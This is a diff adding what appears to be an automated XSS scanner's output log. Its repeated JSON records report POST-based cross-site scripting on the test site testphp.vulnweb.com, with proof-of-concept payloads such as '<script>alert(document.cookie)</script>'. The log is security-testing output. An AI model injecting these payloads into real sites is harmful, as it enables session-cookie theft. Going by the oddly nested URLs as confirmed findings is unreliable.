@@ -1,0 +1,142 @@
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:31.875393418+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:32.484028293+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:33.012866023+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:33.315381567+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:34.010333235+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/index.php/index.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:34.207826515+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:34.88850731+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:34.895120816+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:35.505321725+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:35.505193984+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/categories.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:35.507632357+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:36.016753045+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/categories.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:36.136535764+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/index.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:36.145023599+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/index.php/categories.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:36.204266999+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:37.800546645+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php/index.php/index.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:37.833299266+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:37.900384352+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/categories.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:38.762980517+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/artists.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:38.89048767+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/artists.php/index.php/index.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:39.33154379+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/artists.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:39.728345102+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:40.191757991+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/categories.php/artists.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:40.194598546+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/categories.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:40.202366322+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:40.623944265+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/categories.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:42.182133033+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/categories.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:42.264847523+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/index.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:42.41027794+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php/index.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:42.729032702+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/disclaimer.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:42.826494024+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/disclaimer.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:43.097210405+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/disclaimer.php/index.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:43.376960678+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/artists.php/index.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:43.420567759+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/disclaimer.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:43.770103666+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/artists.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:44.297676694+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/artists.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:44.299770098+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php/artists.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:44.30246821+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/categories.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:44.306977512+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/categories.php/disclaimer.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:44.307510112+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php/index.php/categories.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:44.852651507+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/categories.php/index.php/index.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.40907414+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/categories.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.409114425+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/artists.php/index.php/categories.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.432370537+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/cart.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.432340626+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/artists.php/index.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.706797877+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/index.php/artists.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.720821696+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/disclaimer.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.720682484+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/cart.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:45.739231849+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/disclaimer.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:46.676451098+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php/categories.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:46.684074955+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/categories.php/index.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:46.761428254+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/categories.php/categories.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:47.28208448+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php/categories.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:47.329957322+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/disclaimer.php/categories.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:47.924042483+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/disclaimer.php/index.php/index.php/index.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:48.340016193+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/categories.php/index.php/categories.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:48.351415421+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/disclaimer.php/index.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:48.363908212+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/artists.php/categories.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:49.003803403+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php/artists.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:49.311273846+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/index.php/artists.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:49.328575706+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/artists.php/index.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:49.377881148+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/categories.php/categories.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:49.589634972+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/index.php/index.php/categories.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:49.862422159+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/artists.php/categories.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.005576793+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/disclaimer.php/artists.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.00621131+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/disclaimer.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.019208204+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/index.php/index.php/disclaimer.php","BadPayload":"<script>alert(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.019433796+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/index.php/categories.php/artists.php/categories.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.6460221+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/index.php/index.php/artists.php","BadPayload":"<script>prompt(5000/200)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.657009915+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/artists.php/categories.php/index.php/index.php","BadPayload":"<script>prompt(document.cookie)</script>"}}
+
+{"VulnType":"Detected XSS(POST)","TimeFound":"2024-09-17T19:45:50.756976552+01:00","UrlInfo":{"BadURL":"http://testphp.vulnweb.com/guestbook.php/categories.php/artists.php/index.php","BadPayload":"<script>alert(6000/3000)</script>"}}
+
